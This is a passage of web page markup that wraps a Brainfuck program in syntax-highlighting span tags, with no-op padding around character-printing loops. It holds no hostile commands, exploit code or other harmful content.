class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token 